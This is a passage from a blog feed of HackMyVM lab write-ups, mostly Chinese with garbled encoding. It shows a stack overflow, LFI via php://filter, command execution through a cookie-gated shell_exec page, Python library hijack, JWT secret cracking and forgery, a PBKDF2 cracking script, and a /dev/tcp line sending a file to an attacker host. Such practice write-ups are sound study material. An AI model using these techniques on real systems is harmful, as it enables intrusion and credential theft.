class="line">&lt;kljflkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasdsabcd</span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x64636261</span></span><br><span class="line">&lt;lkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasdsdcba</span><br><span class="line">learner@Learn2Code:/tmp$ </span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°è¾¹ç•Œå€¼ä¹‹åï¼Œæ ¹æ®å›æ˜¾è¾“å…¥abcdï¼Œå‘ç°å¤§å°ç«¯æ˜¯åçš„ï¼Œæ‰€ä»¥è¾“å…¥dcbaï¼Œç„¶åå°±æˆåŠŸæ‹¿åˆ°learnerçš„shelläº†</p>
<p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ç”¨msfåšï¼Œå…ˆç”¨msf-pattern_createç”Ÿæˆä¸€ä¸ªå¾ˆé•¿çš„patternï¼Œç„¶ååœ¨gdbä¸­ä¼ ç»™è¿™ä¸ªç¨‹åºï¼Œè®©ä»–çš„å†…å­˜ç‚¸ï¼Œç„¶åå†å»ç”¨msf-pattern_offsetæ‰¾åˆ°ç²¾ç¡®çš„åç§»é‡</p>
<p>ç„¶ålearnerè¿™ä¸ªç”¨æˆ·ä¹Ÿæœ‰ä¸€ä¸ªç¨‹åºï¼Œåç§°æ˜¯å¯†ç <br>ç„¶åå†ç”¨idaçœ‹çœ‹</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; Attributes: bp-based frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="meta">public</span> main</span><br><span class="line">main proc <span class="built_in">near</span></span><br><span class="line"></span><br><span class="line">var_18= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></span><br><span class="line">var_10= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></span><br><span class="line">var_8= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">20h</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aNoi98ho   <span class="comment">; &quot;NOI98hO&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aIhj       <span class="comment">; &quot;Ihj&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_10], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aJj        <span class="comment">; &quot;)(Jj&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_18], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;If you are a learner, i&#x27;m sure you know&quot;...</span></span><br><span class="line"><span class="keyword">call</span>    _puts</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">retn</span></span><br><span class="line"><span class="comment">; &#125; // starts at 1135</span></span><br><span class="line">main endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±ç›´æ¥ç»™å‡ºå¯†ç äº†<code>NOI98hOIhj)(Jj</code><br>è¾“å…¥å¯†ç å°±æ‹¿åˆ°rootshelläº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">learner<span class="variable">@Learn2Code</span><span class="symbol">:/home/learner</span><span class="variable">$ </span>su - root     </span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line">root<span class="variable">@Learn2Code</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦åˆ°äº†ç”¨wfuzzçˆ†ç ´å€¼ï¼Œç„¶åpythonçš„åå¼¹shellåº”ç”¨<br>pythonè¿‡æ»¤å…³é”®å­—ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™é€šç”¨æ–¹æ³•â€“exec .decode(â€˜base64â€™)<br>äº†è§£pwnçš„ç®€å•æ ˆæº¢å‡ºï¼Œäº†è§£pwnçš„ä¸€äº›åŸºæœ¬åŸç†</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Newbee</title>
    <url>/posts/36480.html</url>
    <content><![CDATA[<p>HMV-Newbeeé¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nmap -p- 192.168.80.150</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 20:50 CST</span><br><span class="line">Nmap scan report for bogon (192.168.80.150)</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 56:99:F1:13:6A:38 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds</span><br></pre></td></tr></table></figure></div>
<p>åªæœ‰ä¸¤ä¸ªå¸¸è§çš„ç«¯å£ ç›´æ¥å»webé‡Œé¢çœ‹</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>webè¿™é‡Œæ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œæœ‰å¾ˆå¤šå…¶ä»–çš„æ¨¡æ¿ï¼Œä½†æ˜¯éƒ½æ˜¯é™æ€é¡µé¢ï¼Œæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¹Ÿä¸èƒ½äº¤äº’<br><img src="https://pic1.imgdb.cn/item/67e93f0c0ba3d5a1d7e6c9d6.png"><br>å¦‚æœç›´æ¥curlä¸€ä¸‹é¦–é¡µï¼Œå‘ç°æœ‰ä¸€ä¸ªä¸åŒå¯»å¸¸çš„æç¤º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--Wrong paramter to GET--&gt; </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¦ä¸€ä¸ªgetå‚æ•°ï¼Œé‚£å°±ç”¨fuzzæ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -u http://192.168.80.150?FUZZ=id -w /usr/share/wordlists/wfuzz/general/common.txt --hw 1267</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.80.150?FUZZ=id/</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                           </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000384:   200        376 L    1270 W     18863 Ch    &quot;hack&quot; </span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°hackå‚æ•°ï¼Œç°åœ¨ç”¨è¿™ä¸ªå‚æ•°å†curlä¸€ä¸‹ï¼Œå‘ç°æç¤ºä¸ä¸€æ ·äº†ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- include failed try another file --&gt;                             </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¯´è¦includeä¸€ä¸ªæ–‡ä»¶ å°è¯•ä¸€ä¸‹ç”¨phpä¼ªåè®®è¯»ä¸€ä¸‹æ–‡ä»¶ä¹Ÿä¸èƒ½ç›´æ¥è¯»å‡º&#x2F;etc&#x2F;passwdï¼Œçœ‹æ¥æ˜¯è¦è¯»å–ä»€ä¹ˆç‰¹å®šçš„æ–‡ä»¶<br>æ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.80.150 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.150</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/index.php            (Status: 200) [Size: 18852]</span><br><span class="line">/contact.php          (Status: 200) [Size: 8853]</span><br><span class="line">/about.php            (Status: 200) [Size: 10036]</span><br><span class="line">/products.php         (Status: 200) [Size: 12163]</span><br><span class="line">/blog.php             (Status: 200) [Size: 9782]</span><br><span class="line">/terms.php            (Status: 200) [Size: 6670]</span><br><span class="line">/assets               (Status: 301) [Size: 317] [--&gt; http://192.168.80.150/assets/]</span><br><span class="line">/testimonials.php     (Status: 200) [Size: 7907]</span><br><span class="line">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.80.150/javascript/]</span><br><span class="line">/checkout.php         (Status: 200) [Size: 13307]</span><br><span class="line">/secret.php           (Status: 200) [Size: 2187]</span><br></pre></td></tr></table></figure></div>
<p>ä¸ä¸€æ ·çš„æ˜¯è¿™ä¸ªsecret.php<br><img src="https://pic1.imgdb.cn/item/67e940a90ba3d5a1d7e6ca07.png"><br>è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç»ˆç«¯å‘½ä»¤è¡Œï¼Œä½†æ˜¯æç¤ºéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œç°åœ¨å†å»ä¸»é¡µé‡Œé¢çœ‹çœ‹èƒ½ä¸èƒ½è¯»å‡ºè¿™ä¸ªæ–‡ä»¶çš„æºä»£ç <br>ç„¶åbase64è§£ç çœ‹åˆ°secretç•Œé¢çš„é€»è¾‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.150/?hack=php://filter/read=convert.base64-encode/resource=secret.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">        if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">            if (isset($_GET[&#x27;command&#x27;])) &#123;</span><br><span class="line">                $command = $_GET[&#x27;command&#x27;];</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                echo &#x27;&lt;div&gt;\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">                echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„éªŒè¯é€»è¾‘æ˜¯æœ‰æ²¡æœ‰Cookie çš„ AreYouAdmin å¦‚æœæœ‰å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤<br>ç”¨bpå‘åŒ…ç„¶ååå¼¹shellæ‹¿åˆ°shell<br><img src="https://pic1.imgdb.cn/item/67e944180ba3d5a1d7e6cb2d.png"></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>wwwç”¨æˆ·å¯ä»¥ç”¨debianç”¨æˆ·æ‰§è¡Œä¸€ä¸ªpythonæ–‡ä»¶ï¼Œç°åœ¨ç›´æ¥ç”¨pythonåº“åŠ«æŒå°±å¯ä»¥å¾—åˆ°debianç”¨æˆ·çš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html$ echo &quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot; &gt; random.py</span><br><span class="line">www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py</span><br><span class="line">sudo: unable to resolve host Newbee: Name or service not known</span><br><span class="line">debian@Newbee:/var/www/html$</span><br></pre></td></tr></table></figure></div>

<p>debianç”¨æˆ·æ²¡æœ‰sudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:~$ ls -al</span><br><span class="line">total 60</span><br><span class="line">drwx------ 5 debian debian 4096 Mar 25 06:24 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Jul 11  2023 ..</span><br><span class="line">-rw-r--r-- 1 root   root      0 Mar  7 00:10 .bash_history</span><br><span class="line">-rw-r--r-- 1 debian debian  220 Mar  7 00:10 .bash_logout</span><br><span class="line">-rw-r--r-- 1 debian debian 3526 Jul 11  2023 .bashrc</span><br><span class="line">drwx------ 3 debian debian 4096 Mar  6 21:40 .gnupg</span><br><span class="line">-rw------- 1 debian debian  119 Mar 25 06:24 .mysql_history</span><br><span class="line">-rw-r--r-- 1 debian debian  807 Jul 11  2023 .profile</span><br><span class="line">drwxr-xr-x 2 root   root   4096 Mar 25 08:02 .secret</span><br><span class="line">drwxr-xr-x 2 debian debian 4096 Mar  8 23:01 .ssh</span><br><span class="line">-rw------- 1 debian debian 9049 Mar  6 22:25 .viminfo</span><br><span class="line">-rw-r--r-- 1 root   root    151 Mar  6 21:25 config.php</span><br><span class="line">-rw-r--r-- 1 root   root    120 Mar  6 21:26 note.txt</span><br><span class="line">-rw-r--r-- 1 debian debian   33 Mar  6 21:45 user.txt</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:~$ cat note.txt </span><br><span class="line">Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me</span><br></pre></td></tr></table></figure></div>
<p>æç¤ºæ˜¯æ•°æ®åº“å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:~$ cd .secret/</span><br><span class="line">debian@Newbee:~/.secret$ ls</span><br><span class="line">hint.txt  password.zip</span><br><span class="line">debian@Newbee:~/.secret$ cat hint.txt </span><br><span class="line">password is md5(key)</span><br><span class="line"></span><br><span class="line">and key is in mysql!!!!!!</span><br></pre></td></tr></table></figure></div>
<p>è¿›å…¥secretä¹‹åè¿˜æœ‰ä¸€ä¸ªæç¤ºï¼Œå¯†ç æ˜¯æ•°æ®åº“é‡Œé¢çš„ md5 è¿™ä¸ªå¯†ç å¯ä»¥ç”¨æ¥è§£å¼€zipæ–‡ä»¶<br>å‘ç°æœ‰ä¸€ä¸ª5000ç«¯å£å¼€æ”¾äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:~/.secret$ ss -lntup</span><br><span class="line">Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process     </span><br><span class="line">udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           128                  127.0.0.1:5000                0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           80                   127.0.0.1:3306                0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           511                          *:80                        *:*                    </span><br><span class="line">tcp        LISTEN      0           128                       [::]:22                     [::]:*</span><br></pre></td></tr></table></figure></div>
<p>è¾“å…¥ps -efæŸ¥çœ‹ç°åœ¨çš„è¿›ç¨‹ï¼Œå¯ä»¥å‘ç°ä¸‹é¢è¿™ä¸ªä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">root         561     549  0 07:49 ?        00:00:00 /bin/sh -c /usr/bin/python3 /var/www/html/flask/main.py</span><br><span class="line">root         565     561  0 07:49 ?        00:00:07 /usr/bin/python3 /var/www/html/flask/main.py</span><br></pre></td></tr></table></figure></div>
<p>ä¹Ÿå°±æ˜¯å¼€äº†ä¸€ä¸ªflaskæœåŠ¡ï¼Œé‚£ç°åœ¨æŠŠè¿™ä¸ªç«¯å£è½¬å‘ä¸€ä¸‹ï¼Œç„¶åå»webé‡Œé¢çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">debian<span class="variable">@Newbee</span><span class="symbol">:~/</span>.secret<span class="variable">$ </span>socat <span class="title class_">TCP</span>-<span class="symbol">LISTEN:</span><span class="number">9999</span>,fork <span class="symbol">TCP4:</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">5000</span> &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">992</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67e947100ba3d5a1d7e6cc90.png"><br>è¾“å…¥ä»»æ„çš„è´¦å·å¯†ç éƒ½èƒ½ç™»å½•<br>ç”¨bpæŠ“åŒ…ä¹‹åå‘ç°è¿™é‡Œæœ‰jwtçš„tokenï¼Œç”¨johnç ´è§£ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# echo &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNkZmEiLCJleHAiOjE3NDMzNDQ5ODR9.ROPsqvA8LkCdvHB0NTE5vSC0tDiw91aaCAAU9n0E5-E&quot; &gt; hash</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">noob             (?)     </span><br><span class="line">1g 0:00:00:02 DONE 3/3 (2025-03-30 21:30) 0.4385g/s 3999Kp/s 3999Kc/s 3999KC/s tykya2..savolie1</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°è¿™ä¸ªjwtçš„å¯†ç noob<br>ç„¶åå»ä¸€ä¸ªjwtåœ¨çº¿ç½‘ç«™çœ‹çœ‹è¿™ä¸ªjwtçš„ä¿¡æ¯æ˜¯ä»€ä¹ˆ<br><img src="https://pic1.imgdb.cn/item/67e947ed0ba3d5a1d7e6ccfd.png"><br>é‚£ç°åœ¨ç”¨å¯†é’¥ä¿®æ”¹jwtçš„usernameæ”¹æˆadmin<br><img src="https://pic1.imgdb.cn/item/67e948420ba3d5a1d7e6cd19.png"><br>æˆåŠŸçœ‹åˆ°æ•°æ®å¯†ç <br>ç„¶åå›åˆ°shellé‡Œé¢çœ‹æ•°æ®åº“ä¸­çš„å†…å®¹ ä¾æ¬¡è¾“å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">show databases;</span><br><span class="line">use user;</span><br><span class="line">show tables;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">| id | username | passwd                                                                                                                   | salt                             | passwd_hash_algo |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">1 row in set (0.064 sec)</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå¯ä»¥è®©aiå†™ä¸€ä¸ªè„šæœ¬ç ´è§£å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡ PBKDF2 å“ˆå¸Œä¿¡æ¯</span></span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8bf3e3452b78544f8bee9400d6936d34&quot;</span>)  <span class="comment"># æå–çš„ salt</span></span><br><span class="line">hash_stored = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0&quot;</span>)  <span class="comment"># æå–çš„ PBKDF2 å“ˆå¸Œ</span></span><br><span class="line">iterations = <span class="number">50500</span>  <span class="comment"># è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">hash_length = <span class="number">60</span>  <span class="comment"># å“ˆå¸Œé•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–å­—å…¸æ–‡ä»¶å¹¶å°è¯•ç ´è§£</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dictionary_attack</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/Users/kakeru/tools/å­—å…¸/password.lst&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> f:</span><br><span class="line">            password = password.strip()</span><br><span class="line">            hash_attempt = hashlib.pbkdf2_hmac(<span class="string">&quot;sha256&quot;</span>, password.encode(), salt, iterations, dklen=hash_length)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> hash_attempt == hash_stored:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] æ‰¾åˆ°å¯†ç : <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] å¤±è´¥: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°åŒ¹é…çš„å¯†ç &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œçˆ†ç ´</span></span><br><span class="line">dictionary_attack()</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°å¯†ç <code>1qaz2wsx</code> ç„¶åæŠŠè¿™ä¸ªå¯†ç md5ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:~/.secret$ echo -n &quot;1qaz2wsx&quot; | md5sum</span><br><span class="line">1c63129ae9db9c60c3e8aa94d3e00495  -</span><br><span class="line">debian@Newbee:~/.secret$ unzip password.zip </span><br><span class="line">Archive:  password.zip</span><br><span class="line">[password.zip] password.png password: </span><br><span class="line">error:  cannot create password.png</span><br><span class="line">        Permission denied</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯æ— æ³•åˆ›å»ºæ–‡ä»¶ï¼Œæ‰€ä»¥å…ˆæŠŠpassword.zipæ–‡ä»¶æ”¾åœ¨tmpç›®å½•ä¸‹é¢ï¼Œç„¶åå†è§£å‹<br>å¾—åˆ°password.zipé‡Œé¢çš„å›¾ç‰‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:/tmp$ cat password.png  &gt; /dev/tcp/192.168.80.11/1234 </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234  &gt; a.png</span><br></pre></td></tr></table></figure></div>
